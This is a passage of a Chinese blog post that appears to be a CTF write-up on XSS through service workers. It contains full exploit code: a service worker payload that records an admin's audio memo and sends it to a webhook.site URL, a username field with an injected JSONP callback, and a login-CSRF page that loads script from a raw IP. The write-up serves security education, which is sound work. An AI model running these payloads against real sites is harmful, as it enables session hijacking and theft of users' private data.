+<p><img src="https://img-blog.csdnimg.cn/8fa4fbd59b044aa3a28977d03ab3a475.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/5df5056ff00a41b6887e60e255ae83c5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这样就引入了我们外部的js文件，并且可以完整的执行任意js代码。所以这里的js代码如何用来窃取备忘录呢。</p>
+<p>最开始其实说到了一个service worker是可以拦截一个fetch请求的，并且可以篡改responce。所以这里如果可以让admin在访问我们提供的界面时请求另一个界面，那我们是不是就可以拦截这个请求，然后执行我们自己的代码。并且利用js代码是可以将mp3的文件内容进行播放并转换成base编码的。同时你可以看到bot的js文件。bot的实现中，会先去访问我们提供的url，然后才会回到/home，最后是进行登出。看到出题人的记录还可以发现，其实我们可以直接在拦截过程中将click点击后的结果直接进行替换，让bot永远停留，播放我们要窃取的MP3文件。</p>
+<p><img src="https://img-blog.csdnimg.cn/97feae30d51d41d2ab2a06880910dc06.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>所以如何让admin访问时请求另一个界面，可以通过控制jsonp函数进行window.opener的回调就可以了！然后在service worker中用window.opener.origin回到最初的窗口。然后通过dom找到我们需要的audio，进行录制。</p>
+<h3 id="最终的攻击流程"><a href="#最终的攻击流程" class="headerlink" title="最终的攻击流程"></a>最终的攻击流程</h3><p>首先需要事先注册两个用户，一个用来引用外部的js文件，如上。注册的service worker js代码为</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">self.addEventListener(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-keyword">async</span> (e) =&gt; &#123;<br>    <span class="hljs-keyword">if</span>(e.request.url.includes(<span class="hljs-string">&quot;/api/user/strellpwn&quot;</span>)) &#123;<br>        e.respondWith(<span class="hljs-keyword">new</span> Response(<span class="hljs-keyword">new</span> Blob([<span class="hljs-string">`</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string">const webhook = &quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const log = (body) =&gt; &#123;</span><br><span class="hljs-string">    console.log(body);</span><br><span class="hljs-string">    fetch(webhook, &#123;</span><br><span class="hljs-string">        method: &quot;POST&quot;,</span><br><span class="hljs-string">        body,</span><br><span class="hljs-string">        mode: &quot;no-cors&quot;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const blobToBase64 = (blob) =&gt; &#123;</span><br><span class="hljs-string">  return new Promise((resolve, _) =&gt; &#123;</span><br><span class="hljs-string">    const reader = new FileReader();</span><br><span class="hljs-string">    reader.onloadend = () =&gt; resolve(reader.result);</span><br><span class="hljs-string">    reader.readAsDataURL(blob);</span><br><span class="hljs-string">  &#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">const pwn = () =&gt; &#123;</span><br><span class="hljs-string">    try &#123;</span><br><span class="hljs-string">        window.opener.origin;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    catch(err) &#123;</span><br><span class="hljs-string">        console.log(&quot;still cross origin...&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    try &#123;</span><br><span class="hljs-string">        window.opener.document.body.querySelector</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    catch(err) &#123;</span><br><span class="hljs-string">        console.log(&quot;page same-origin, but not loaded yet..&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let aud = window.opener.document.body.querySelector(&quot;audio&quot;);</span><br><span class="hljs-string">    if(!aud) &#123;</span><br><span class="hljs-string">        console.log(&quot;audio tag missing...&quot;);</span><br><span class="hljs-string">        setTimeout(pwn, 500);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let stream = aud.captureStream();</span><br><span class="hljs-string">    let rec = new MediaRecorder(stream);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    log(&quot;found_audio&quot;);</span><br><span class="hljs-string">    console.log(aud);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    let btn = window.opener.document.querySelector(&quot;form[action=&#x27;/api/logout&#x27;] button&quot;);</span><br><span class="hljs-string">    if(!btn) &#123;</span><br><span class="hljs-string">        log(&quot;logout button missing!!!&quot;);</span><br><span class="hljs-string">        return;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    btn.onclick = (e) =&gt; &#123;</span><br><span class="hljs-string">        e.preventDefault();</span><br><span class="hljs-string">        aud.play();</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    aud.onplay = () =&gt; &#123;</span><br><span class="hljs-string">        log(&quot;recording&quot;);</span><br><span class="hljs-string">        let chunks = [];</span><br><span class="hljs-string">        rec.ondataavailable = e =&gt; chunks.push(e.data);</span><br><span class="hljs-string">        rec.onstop = async e =&gt; &#123;</span><br><span class="hljs-string">            let final = new Blob(chunks, &#123;</span><br><span class="hljs-string">                type: &#x27;audio/mpeg&#x27;</span><br><span class="hljs-string">            &#125;);</span><br><span class="hljs-string">            let b64 = await blobToBase64(final);</span><br><span class="hljs-string">            log(b64);</span><br><span class="hljs-string">            console.log(&quot;done~&quot;);</span><br><span class="hljs-string">        &#125;;</span><br><span class="hljs-string">        rec.start();</span><br><span class="hljs-string">    &#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    log(&quot;ready...&quot;);</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string"></span><br><span class="hljs-string">window.onload = () =&gt; &#123;</span><br><span class="hljs-string">    if(window.opener.name !== &quot;pwning&quot;) return window.close();</span><br><span class="hljs-string">    setTimeout(() =&gt; window.open(&quot;&quot;, &quot;lmao&quot;).close(), 3000);</span><br><span class="hljs-string">    log(&quot;loaded&quot;);</span><br><span class="hljs-string">    console.log(&quot;loaded&quot;);</span><br><span class="hljs-string">    pwn();</span><br><span class="hljs-string">&#125;;</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">        `</span>], &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;text/html&#x27;</span> &#125;)));<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span>;<br>&#125;);<br></code></pre></div></td></tr></table></figure>
+
+
+
+<p>另外一个需要注册来让admin请求另外的窗口</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">fetch(<span class="hljs-string">&quot;/api/register&quot;</span>, &#123;<br>    method: <span class="hljs-string">&quot;POST&quot;</span>,<br>    headers: &#123;<br>        <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>    &#125;,<br>    body: <span class="hljs-string">&quot;&amp;username=&quot;</span> + <span class="hljs-built_in">encodeURIComponent</span>(<span class="hljs-string">`/api/user/strellpwn?#&lt;iframe async srcdoc=&quot;&lt;script src=&#x27;/api/user/info?callback=window.parent.open&#x27;&gt;&lt;/script&gt;&quot;&gt;&lt;/iframe&gt;`</span>) + <span class="hljs-string">&quot;&amp;username=b&amp;password=12345&quot;</span><br>&#125;);<br></code></pre></div></td></tr></table></figure>
+
+<p>然后写一个html，起一个监听服务，让bot访问去登录</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>    &lt;body&gt;<br>        &lt;form method=<span class="hljs-string">&quot;POST&quot;</span> action=<span class="hljs-string">&quot;http://127.0.0.1:9999/api/login&quot;</span> target=<span class="hljs-string">&quot;lmao&quot;</span>&gt;<br>            &lt;input name=<span class="hljs-string">&quot;username&quot;</span> /&gt;<br>            &lt;input name=<span class="hljs-string">&quot;username&quot;</span> value=<span class="hljs-string">&quot;b&quot;</span> /&gt;<br>            &lt;input name=<span class="hljs-string">&quot;password&quot;</span> /&gt;<br>        &lt;/form&gt;<br>        &lt;script&gt;<br>            <span class="hljs-keyword">const</span> sleep = <span class="hljs-function">(<span class="hljs-params">ms</span>) =&gt;</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> <span class="hljs-built_in">setTimeout</span>(r, ms));<br>            <span class="hljs-built_in">window</span>.onload = <span class="hljs-keyword">async</span> () =&gt; &#123;<br>                <span class="hljs-keyword">let</span> $ = <span class="hljs-built_in">document</span>.querySelector.bind(<span class="hljs-built_in">document</span>);<br>                navigator.sendBeacon(<span class="hljs-string">&quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;</span>, <span class="hljs-string">&quot;start&quot;</span>);<br><br>                $(<span class="hljs-string">&quot;input[name=username]&quot;</span>).value = <span class="hljs-string">`//39.107.239.30:2333/notekeeper.js?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/notes/list?callback=window.parent.navigator.serviceWorker.register&#x27;&gt;&lt;/sc`</span> + <span class="hljs-string">`ript&gt;&quot;&gt;&lt;/iframe&gt;`</span>;<br>                $(<span class="hljs-string">&quot;input[name=password]&quot;</span>).value = <span class="hljs-string">`12345`</span>;<br>                $(<span class="hljs-string">&quot;form&quot;</span>).submit();<br><br>                <span class="hljs-keyword">await</span> sleep(<span class="hljs-number">2500</span>);<br><br>                $(<span class="hljs-string">&quot;input[name=username]&quot;</span>).value = <span class="hljs-string">`/api/user/strellpwn?#&lt;iframe srcdoc=&quot;&lt;script src=&#x27;/api/user/info?callback=window.parent.open&#x27;&gt;&lt;/sc`</span> + <span class="hljs-string">`ript&gt;&quot;&gt;&lt;/iframe&gt;`</span>;<br>                $(<span class="hljs-string">&quot;input[name=password]&quot;</span>).value = <span class="hljs-string">`12345`</span>;<br>                $(<span class="hljs-string">&quot;form&quot;</span>).submit();<br><br>                <span class="hljs-built_in">window</span>.name = <span class="hljs-string">&quot;pwning&quot;</span>;<br>                navigator.sendBeacon(<span class="hljs-string">&quot;https://webhook.site/1635fdff-7154-4586-b16c-dbc680be9f75&quot;</span>, <span class="hljs-string">&quot;end&quot;</span>);<br>                location.href = <span class="hljs-string">&quot;http://127.0.0.1:9999/home?gogogo&quot;</span>;<br>            &#125;;<br>        &lt;/script&gt;<br>    &lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></div></td></tr></table></figure>
+
+<p>访问成功时可以看到，bot并没有登出，也可以看到成功访问了两个账户。</p>
+<p><strong><img src="https://img-blog.csdnimg.cn/f9a046d57de543fa9542853139987f8b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></strong></p>
+<p>但是由于可能js录音音频的原因，在webhook.site中会等待的有些慢，所以需要多让bot访问几次。最终能够看到，成功窃取到管理员语音备忘录。</p>
+<p><img src="https://img-blog.csdnimg.cn/edb0fdb735ab4d53a5183118ef4e3978.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/210f9de4194241bbb5a08b9e2f3a48d6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>最后将base编码放入src标签中就可以的到音频了</p>
+<p><img src="https://img-blog.csdnimg.cn/aabb695e8efc4d9595ffcdd599a46266.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h2 id="西湖论剑2020xss"><a href="#西湖论剑2020xss" class="headerlink" title="西湖论剑2020xss"></a>西湖论剑2020xss</h2><p>这也是一道可以利用service worker的题目，但比上面的那题要简单一些。但是由于没有环境所以就来看看思路吧。</p>
+<p>关键源码，首先可以可以看到auto_reg_var()函数存在变量覆盖，故可以将callback变量覆盖掉，且jsonp返回的数据会被当做js代码执行，如?callback=alert(1)既可弹窗，但是存在50个字符的限制，不过可以通过引入外部js或者通过变量覆盖+eval来绕过。</p>
+<p>后面也重写了jsonp函数，而且可以看到里面的操作，很关键的在于对于参数的拼接<code>url = url + &quot;?&quot; + &quot;callback=&quot; + funName;</code>。所以这里与上面很大的不同就是这里你可以在拼接过程中进行一些恶意的注释，从而可以直接通过importScripts引入js文件。</p>
+<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js">callback = <span class="hljs-string">&quot;get_user_login_status&quot;</span>;<br>auto_reg_var();<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">typeof</span>(jump_url) == <span class="hljs-string">&quot;undefined&quot;</span> || <span class="hljs-regexp">/^\//</span>.test(jump_url))&#123;<br>	jump_url = <span class="hljs-string">&quot;/&quot;</span>;<br>&#125;<br>jsonp(<span class="hljs-string">&quot;https://auth.hardxss.xhlj.wetolink.com/api/loginStatus?callback=&quot;</span> + callback,<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>)</span>&#123;<br>			<span class="hljs-keyword">if</span>(result[<span class="hljs-string">&#x27;status&#x27;</span>])&#123;<br>				location.href = jump_url;<br>			&#125;<br>		&#125;)<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jsonp</span>(<span class="hljs-params">url, success</span>) </span>&#123;<br>		  <span class="hljs-keyword">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&quot;script&quot;</span>);<br>		  <span class="hljs-keyword">if</span>(url.indexOf(<span class="hljs-string">&quot;callback&quot;</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>		    	<span class="hljs-keyword">var</span> funName = <span class="hljs-string">&#x27;callback_&#x27;</span> + <span class="hljs-built_in">Date</span>.now() + <span class="hljs-built_in">Math</span>.random().toString().substr(<span class="hljs-number">2</span>, <span class="hljs-number">5</span>);<br>		    	url = url + <span class="hljs-string">&quot;?&quot;</span> + <span class="hljs-string">&quot;callback=&quot;</span> + funName;<br>		    &#125;<span class="hljs-keyword">else</span>&#123;<br>		    	<span class="hljs-keyword">var</span> funName = callback;<br>		    &#125;<br>		    <span class="hljs-built_in">window</span>[funName] = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>) </span>&#123;<br>		        success(data);<br>		        <span class="hljs-keyword">delete</span> <span class="hljs-built_in">window</span>[funName];<br>		        <span class="hljs-built_in">document</span>.body.removeChild(script);<br>		    &#125;<br>		    script.src = url;<br>		    <span class="hljs-built_in">document</span>.body.appendChild(script);<br>		&#125;<br>		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">auto_reg_var</span>(<span class="hljs-params"></span>)</span>&#123;<br>			<span class="hljs-keyword">var</span> search = location.search.slice(<span class="hljs-number">1</span>);<br>			<span class="hljs-keyword">var</span> search_arr = search.split(<span class="hljs-string">&#x27;&amp;&#x27;</span>);<br>			<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>;i &lt; search_arr.length; i++)&#123;<br>				[key,value] = search_arr[i].split(<span class="hljs-string">&quot;=&quot;</span>);<br>				<span class="hljs-built_in">window</span>[key] = value;<br>			&#125;<br>		&#125;<br></code></pre></div></td></tr></table></figure>
+
+<p>最终的攻击过程，看看网上的吧，题目太久远了，也没找到环境，就没法复现了，但思路都差不多</p>
+<p><img src="https://img-blog.csdnimg.cn/2c921ec523c542fd8cf7aa11cf18e3b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/ctf/">ctf</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/ctf/">ctf</a>
+                    
+                      <a class="hover-with-bg" href="/tags/xss/">xss</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/07/2021-11-%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">强网拟态</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/11/06/2021-11-%E7%BD%91%E9%BC%8E%E6%9D%AFjava%E9%A2%98/">
+                        <span class="hidden-mobile">java做题1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
